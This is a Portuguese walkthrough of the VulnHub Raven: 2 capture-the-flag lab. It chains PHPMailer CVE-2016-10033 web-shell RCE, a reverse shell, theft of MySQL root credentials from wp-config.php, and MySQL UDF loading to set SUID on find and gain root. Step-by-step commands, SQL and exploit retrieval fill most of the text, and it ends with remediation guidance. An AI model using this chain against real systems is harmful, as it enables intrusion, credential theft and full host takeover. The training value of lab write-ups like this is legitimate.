# Raven: 2 — O Corvo Não Grita Mais

Olha essa aqui galera!! Raven: 2 pega tudo que Raven 1 te ensinou e amplifica. Onde a primeira máquina tinha um caminho de escalada mais simples, Raven 2 adiciona o exploit de UDF do MySQL: uma das técnicas de escalada de privilégios mais elegantes, obscuras e historicamente importantes no pentest Linux. Você encontra um PHPMailer vulnerável em um diretório vendor exposto publicamente, explora CVE-2016-10033 para implantar um shell web, pega as credenciais root do MySQL no wp-config.php, e aí compila uma biblioteca compartilhada que dá ao MySQL a capacidade de executar comandos do sistema como root. Cadeia absurda, mano.

Salve ao criador do Raven por fazer uma sequência que realmente ensina algo novo. Conteúdo obrigatório para quem quer entender escalada de privilégios de banco de dados para SO.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Raven: 2 |
| **VM Atacante** | Kali Linux 2024.x |
| **URL VulnHub** | https://www.vulnhub.com/entry/raven-2,269/ |
| **Técnicas** | Enumeração de diretórios web, revelação de versão PHPMailer, RCE CVE-2016-10033, escalada de privilégios MySQL UDF (EDB-1518), GTFOBin find SUID |
| **CVEs** | CVE-2016-10033 (RCE PHPMailer < 5.2.18 via injeção no cabeçalho From), CVE-2016-6662 (execução de código root MySQL UDF) |
| **Grupos APT** | FIN7 (usa RCE de CMS e webmail para acesso inicial em setores de varejo e hospitalidade); Sandworm (exploração MySQL e carregamento UDF documentados em intrusões no setor de energia) |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80), rpcbind (111)
  → Browse porta 80 → site WordPress Raven Security
  → dirb → /vendor/ (listagem de diretório habilitada)
  → curl /vendor/PATH → flag1
  → curl /vendor/VERSION → 5.2.6 (PHPMailer)
  → PHPMailer 5.2.6 → CVE-2016-10033 RCE
  → Exploit: criar cabeçalho From malformado → escrita de arquivo PHP
  → nc -lvnp 443 → curl shell.php → reverse shell como www-data
  → cat /var/www/flag2.txt → flag2
  → ls /var/www/html/wp-content/uploads/2018/11/ → flag3 (imagem)
  → cat /var/www/html/wp-config.php → DB_USER: root, DB_PASSWORD: R@v3nSecurity
  → mysql -u root -pR@v3nSecurity
  → searchsploit 1518 → exploit MySQL UDF
  → compilar 1518.c → criar função do_system → chmod u+s /usr/bin/find
  → sair mysql → find /tmp -exec /bin/sh \; → uid=0(root)
  → cat /root/flag4.txt → flag4
```

---

## Metodologia

1. Scan completo de portas: SSH (22), HTTP (80), rpcbind (111)
2. Navegação web: identificar site WordPress Raven Security
3. Enumeração de diretórios com dirb: encontrar diretório /vendor/ exposto
4. Revelação da versão PHPMailer no /vendor/VERSION
5. RCE CVE-2016-10033: criar cabeçalho From malicioso para implantar shell PHP
6. Reverse shell via backdoor implantado
7. Enumerar flags 1, 2, 3
8. Extrair credenciais root do MySQL do wp-config.php
9. Exploit UDF MySQL (EDB-1518): compilar biblioteca compartilhada, carregar no MySQL
10. Usar UDF para definir SUID em /usr/bin/find
11. GTFOBin find para shell root
12. Captura da flag root

---

## Passo 1 — Reconhecimento

```bash
nmap -sV -sC 192.168.1.101
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1
80/tcp  open  http    Apache httpd 2.4.10
111/tcp open  rpcbind
```

Navegar para a porta 80: um site da empresa "Raven Security" rodando WordPress.

---

## Passo 2 — Enumeração: Diretório Vendor e Revelação da Versão PHPMailer

Executar dirb contra o web root:

```bash
dirb http://192.168.1.101/
```

```
http://192.168.1.101/vendor/     [listagem de diretório habilitada]
```

O diretório `/vendor/` está exposto com listagem de diretório. É onde o Composer armazena dependências de pacotes PHP. Arquivos notáveis dentro:

```bash
curl http://192.168.1.101/vendor/PATH
# Contém: flag1

curl http://192.168.1.101/vendor/VERSION
# Contém: 5.2.6

curl http://192.168.1.101/vendor/PHPMailerAutoload.php
# Confirma: biblioteca PHPMailer
```

**PHPMailer 5.2.6 é vulnerável ao CVE-2016-10033** — execução remota de código via endereço `From` especialmente criado no cabeçalho de e-mail. Isso permite que um atacante escreva arquivos PHP arbitrários no web root.

**Nota do mundo real:** Expor o diretório `/vendor/` de projetos PHP gerenciados pelo Composer é uma má configuração crítica. Revela as versões exatas de cada dependência, tornando a identificação de CVEs trivial. Isso é encontrado em sites WordPress, aplicações Laravel e qualquer projeto PHP onde o web root está definido para a raiz do projeto em vez do subdiretório `/public/`. FIN7 foi observado visando aplicações web com vendor exposto como parte do reconhecimento inicial.

---

## Passo 3 — RCE PHPMailer 5.2.6 (CVE-2016-10033)

CVE-2016-10033 permite RCE via o cabeçalho `From` no modo `sendmail` do PHPMailer. A vulnerabilidade: sanitização insuficiente do endereço `From` permite injeção de comando quando o endereço é passado para o shell.

Localizar o formulário de contato no site, tipicamente em `/contact.php` ou similar.

Usar o exploit público (múltiplos scripts Python disponíveis):

```bash
# Encontrar exploit
searchsploit phpmailer 5.2.6

# Configuração chave do exploit:
target = "http://192.168.1.101/contact.php"
backdoor = "shell.php"
lhost = "192.168.1.106"  # IP do atacante

# O exploit envia uma requisição POST criada para o formulário de contato
# O endereço From malformado injeta um payload de escrita de arquivo PHP
# Resultado: shell.php é escrito no web root
```

Iniciar listener:

```bash
nc -lvnp 443
```

Executar o exploit. Quando o backdoor for confirmado escrito, acioná-lo:

```bash
curl http://192.168.1.101/shell.php
```

Callback do reverse shell recebido como `www-data`. Fazer upgrade para PTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Nota do mundo real:** CVE-2016-10033 (e seu gêmeo CVE-2016-10045) afetou milhões de sites WordPress que usavam a implementação de formulário de contato do PHPMailer. A vulnerabilidade foi corrigida silenciosamente no PHPMailer 5.2.18 sem anúncio público, o que significa que muitas implantações permaneceram vulneráveis por meses ou anos após o patch. Versões abaixo de 5.2.18 devem ser consideradas completamente inseguras.

---

## Passo 4 — Coleta de Flags e Credenciais MySQL

Enumerar o sistema de arquivos em busca de flags e credenciais:

```bash
# Flag 2
ls /var/www/
cat /var/www/flag2.txt

# Flag 3 (armazenada como imagem nos uploads do WordPress)
ls /var/www/html/wp-content/uploads/2018/11/
# Um desses arquivos é flag3.png — visualizar no navegador

# Credenciais MySQL do wp-config.php
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_NAME', 'wordpress');
```

MySQL está rodando como o usuário `root` do SO com credenciais de banco de dados root: dupla má configuração crítica.

**Nota do mundo real:** Instalações WordPress frequentemente usam credenciais de banco de dados armazenadas em texto puro no `wp-config.php`. Quando o MySQL roda como usuário root do SO, um comprometimento do banco de dados se traduz diretamente em comprometimento do SO. Isso está documentado em múltiplas alertas da CISA sobre implantações WordPress em infraestrutura crítica.

---

## Passo 5 — Escalada de Privilégios MySQL UDF (EDB-1518)

Conectar ao MySQL com as credenciais root:

```bash
mysql -u root -pR@v3nSecurity
```

Baixar o exploit UDF (Exploit-DB 1518) na máquina atacante:

```bash
searchsploit -m 1518
# 1518.c está agora no diretório atual
python3 -m http.server 8000
```

Na máquina alvo, compilar a biblioteca compartilhada:

```bash
cd /tmp
wget http://192.168.1.106:8000/1518.c
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so.1 -o 1518.so 1518.o -lc
```

No MySQL, carregar a UDF:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
```

Usar a UDF para definir o bit SUID no `/usr/bin/find`:

```sql
select do_system('chmod u+s /usr/bin/find');
```

Sair do MySQL e verificar:

```bash
exit
ls -la /usr/bin/find
# -rwsr-xr-x ... /usr/bin/find
```

**O que é uma UDF?** Uma Função Definida pelo Usuário no MySQL é uma biblioteca compartilhada compilada (.so) que o MySQL carrega e executa. Quando o MySQL roda como root, a UDF executa como root. EDB-1518 define uma função `do_system()` que chama `system()` da libc: execução arbitrária de comandos do SO como root de dentro do banco de dados.

**Nota do mundo real:** Esta técnica foi documentada em 2006 (EDB-1518) e ainda é relevante hoje porque instalações MySQL e MariaDB com privilégios de banco de dados root e diretórios de plugins graváveis aparecem regularmente. O Sandworm usou técnicas no estilo UDF MySQL em várias intrusões em sistemas de controle industrial para pivotar de acesso web para root do SO.

---

## Passo 6 — GTFOBin: SUID find para Shell Root

O binário `find` agora tem o bit SUID definido. Usar a técnica GTFOBins do `find`:

```bash
find /tmp -exec "/bin/sh" \; -quit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ Root. Todas as 4 flags capturadas.

```bash
cat /root/flag4.txt
```

---

## Resumo de Todas as Flags

| Flag | Localização | Como Encontrada |
|---|---|---|
| flag1 | /vendor/PATH (acessível via web) | dirb + listagem de diretório |
| flag2 | /var/www/flag2.txt | Enumeração via shell |
| flag3 | /var/www/html/wp-content/uploads/2018/11/ (imagem) | Enumeração via shell |
| flag4 | /root/flag4.txt | Shell root após exploit UDF |

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Flag 1 | (no vendor/PATH) | Diretório /vendor/PATH | Capturada via navegação web |
| Credencial MySQL | root:R@v3nSecurity | /var/www/html/wp-config.php | Login MySQL root |
| Flag 2 | (texto plano) | /var/www/flag2.txt | Capturada via shell |
| Flag 3 | (arquivo de imagem) | Diretório uploads WordPress | Visualizada no navegador |
| Shell Root | uid=0(root) | MySQL UDF + SUID find | Capturada via GTFOBin |
| Flag 4 | (texto plano) | /root/flag4.txt | Capturada via shell root |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Aprendizado Chave |
|---|---|---|---|
| 1 | Diretório /vendor/ exposto com listagem de diretório | Revela a versão exata de cada dependência PHP; identificação trivial de CVEs | Definir web root como /public/; desativar listagem de diretórios; bloquear /vendor/ na configuração do servidor web |
| 2 | PHPMailer 5.2.6 (CVE-2016-10033): injeção no cabeçalho From RCE | Afetou milhões de formulários de contato WordPress globalmente; corrigido silenciosamente | Fazer upgrade do PHPMailer para 5.2.18+; validar toda entrada de e-mail no lado do servidor |
| 3 | MySQL rodando como root com credenciais root no wp-config.php | Comprometimento do banco de dados equivale a comprometimento do SO quando MySQL é root | Executar MySQL como usuário de sistema dedicado com poucos privilégios; usar conta de BD com menos privilégios para WordPress |
| 4 | Carregamento UDF MySQL habilitado com diretório de plugins gravável | Carregamento UDF é um caminho documentado de root BD para root SO desde 2006 | Definir secure_file_priv; restringir permissões do diretório de plugins MySQL; nunca executar MySQL como root |
| 5 | SUID no /usr/bin/find (definido pelo exploit UDF) | SUID em utilitários de uso geral trivialmente produz root via GTFOBins | Auditar binários SUID regularmente; nunca definir SUID em find, cp, mv ou utilitários similares |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Coleta | Coletar Informações do Host Alvo | T1592 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Execução | Execução | Interpretador: Shell Unix | T1059.004 |
| Acesso a Credenciais | Acesso | Credenciais em Arquivos | T1552.001 |
| Escalada de Privilégios | Escalada | Criar ou Modificar Processo do Sistema | T1543 |
| Escalada de Privilégios | Escalada | Abuso de Controle de Elevação: Setuid | T1548.001 |
| Persistência | Persistência | Web Shell | T1505.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Bloquear diretório /vendor/ na configuração do servidor web**: `Deny from all` no `.htaccess` do Apache ou `location /vendor/` no nginx; definir web root como `/public/`
2. **Fazer upgrade do PHPMailer para 5.2.18 ou posterior**: aplicar patch no CVE-2016-10033 e todas as vulnerabilidades relacionadas de injeção de cabeçalho
3. **Executar MySQL como usuário dedicado com poucos privilégios**: usuário de sistema `mysql` sem privilégios de SO; sem credenciais root de BD na configuração da aplicação
4. **Restringir carregamento de UDF MySQL**: definir `secure_file_priv = ""`; restringir permissões do diretório de plugins; `plugin_dir` para localização não gravável
5. **Auditar binários SUID**: `find / -perm -u=s -type f 2>/dev/null`; nunca definir SUID em utilitários de uso geral
6. **Desativar listagem de diretórios**: `Options -Indexes` no Apache; adicionar à configuração global

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar dependências PHP; rastrear exposição do diretório vendor |
| Proteger | Controle de Acesso | Bloquear /vendor/ do acesso web; restringir MySQL a usuário dedicado |
| Proteger | Segurança de Dados | Sem credenciais root do BD no wp-config.php; usar gerenciamento de segredos |
| Detectar | Anomalias e Eventos | Alertar sobre padrões de exploração PHPMailer; monitorar diretório de plugins MySQL |
| Responder | Planejamento de Resposta | Remover webshells implantados; rotacionar credenciais MySQL e do SO |
| Recuperar | Planejamento de Recuperação | Fazer upgrade do PHPMailer; restringir MySQL; auditar binários SUID |

### CISA KEV

CVE-2016-10033 (RCE PHPMailer) está catalogado no catálogo de Vulnerabilidades Exploradas Conhecidas da CISA. Todas as instalações de PHPMailer abaixo de 5.2.18 devem ser atualizadas ou isoladas imediatamente. O Alerta CISA AA21-116A referencia especificamente a exploração de CMS como vetor primário de acesso inicial para atores de ameaça que visam infraestrutura crítica.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Software | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Credenciais | MIL3 |

---

## Considerações Finais

Véi, Raven: 2 é uma sequência feita do jeito certo. Constrói sobre a base do Raven 1 e introduz a técnica de UDF MySQL: um dos caminhos de escalada de privilégios mais historicamente significativos na segurança Linux. O fato de esta técnica ter sido documentada em 2006 e ainda funcionar em ambientes de 2024 diz tudo sobre o quão lentamente a segurança de configuração melhora em produção.

A cadeia nesta máquina: revelação do diretório vendor, identificação de CVE, RCE, wp-config.php, root MySQL, compilação UDF, definição SUID, GTFOBin, root. Cada passo tem uma razão clara. Cada correção é direta. Isso é banco de dados para root, e você agora sabe fazer.

GG mano, o corvo não grita mais. (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧

Thanks guys!! (❍ᴥ❍ʋ)
